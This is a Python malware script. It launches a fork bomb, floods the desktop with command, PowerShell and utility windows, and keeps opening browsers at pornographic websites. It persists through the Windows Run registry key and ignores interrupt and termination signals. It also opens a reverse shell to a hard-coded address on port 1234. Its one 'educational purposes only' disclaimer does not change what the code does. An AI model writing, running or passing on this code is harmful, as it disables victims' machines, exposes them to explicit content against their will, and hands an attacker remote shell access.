from multiprocessing import Process, cpu_count
import time
import os
import subprocess
import winreg
import signal
import threading
import sys
import socket
import pty

def counter(num):
    while True:
        num -= 1
        time.sleep(0.001)

def go_to_hell():
    num_processors = cpu_count()
    num_processes = num_processors * 1000
    process_count = 0
    while True:
        processes = [Process(target=counter, args=(1000,)) for _ in range(num_processes)]
        for process in processes:
            process.start()
            process_count += 1
        time.sleep(0.2)

def spawn_my_bros(urls):
    browser_paths = {
        'chrome': [
            'C:/Program Files/Google/Chrome/Application/chrome.exe',
            'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe',
            'C:/Program Files/Google/Chrome Beta/Application/chrome.exe',
            'C:/Program Files/Google/Chrome Dev/Application/chrome.exe'
        ],
        'firefox': [
            'C:/Program Files/Mozilla Firefox/firefox.exe',
            'C:/Program Files (x86)/Mozilla Firefox/firefox.exe'
        ],
        'edge': [
            'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe',
            'C:/Program Files/Microsoft/Edge/Application/msedge.exe'
        ],
        'opera': [
            'C:/Program Files/Opera/launcher.exe',
            'C:/Program Files (x86)/Opera/launcher.exe'
        ],
        'brave': [
            'C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe',
            'C:/Program Files (x86)/BraveSoftware/Brave-Browser/Application/brave.exe'
        ],
        'vivaldi': [
            'C:/Program Files/Vivaldi/Application/vivaldi.exe',
            'C:/Program Files (x86)/Vivaldi/Application/vivaldi.exe'
        ]
    }
    def open_my_sources(browser_path, url):
        try:
            subprocess.Popen([browser_path, url])
        except Exception as e:
            pass
    def open_sources_paths(urls):
        threads =[]
        for browser_name, paths in browser_paths.items():
            for path in paths:
                if os.path.isfile(path):
                    for url in urls:
                        thread = threading.Thread(target=open_my_sources, args=(path, url))
                        thread.start()
                    break
            else:
                continue
    while True:
        open_sources_paths(urls)
        time.sleep(5)

def open_my_playground():
    terminal_emulators = [
        "gnome-terminal",
        "konsole",
        "xfce4-terminal",
        "lxterminal",
        "mate-terminal",
        "terminator",
        "xterm",
        "urxvt"
    ]
    for emulator in terminal_emulators:
        try:
            if subprocess.call(["which", emulator], stdout=subprocess.DEVNULL) == 0:
                os.system(f"{emulator} &")
                return True
        except Exception as e:
            continue
    return False

def spawn_my_playground():
    while True:
        if os.name == "nt":
            os.system("start cmd")
            os.system("start powershell")
            os.system("start calc")
            os.system("start taskmgr")
            os.system("start notepad")
            os.system("start control")
        else:
            if not open_my_playground():
                break
        time.sleep(0.1)

def add_to_registry():
    exe_path = sys.executable
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        key_name = f"dubidubidoopdoop"
        winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, exe_path)
        time.sleep(0.01)
        winreg.CloseKey(registry_key)
    except Exception as e:
        pass
    
def reverse_shell(server_ip, server_port):
    """
    This function creates a reverse shell connection to the specified server IP and port.
    WARNING: This script is intended for educational purposes only. Unauthorized use can result in serious legal consequences.
    Use responsibly and only in environments where you have explicit permission.
    """
    # Create a TCP socket using IPv4 and TCP protocol
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect the socket to the attacker's server
    s.connect((server_ip, server_port))

    # Redirect standard input, output, and error streams to the socket
    os.dup2(s.fileno(), 0)  # Redirect stdin to the socket
    os.dup2(s.fileno(), 1)  # Redirect stdout to the socket
    os.dup2(s.fileno(), 2)  # Redirect stderr to the socket

    # Spawn a new shell process and connect it to the socket
    pty.spawn("/bin/sh")

def signal_handler(signum, frame):
    pass

def launch():
    add_to_registry()
    urls = [
        "https://www.pornhub.com",
        "https://www.beeg.com",
        "https://www.xnxx.com"
    ]
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    process_creator = Process(target=go_to_hell)
    process_creator.start()
    cmd_thread = threading.Thread(target=spawn_my_playground)
    cmd_thread.start()
    reverse_shell_thread = threading.Thread(target=reverse_shell, args=("192.168.43.245", 1234))
    reverse_shell_thread.start()
    spawn_my_bros(urls)

if __name__ == "__main__":
    launch()
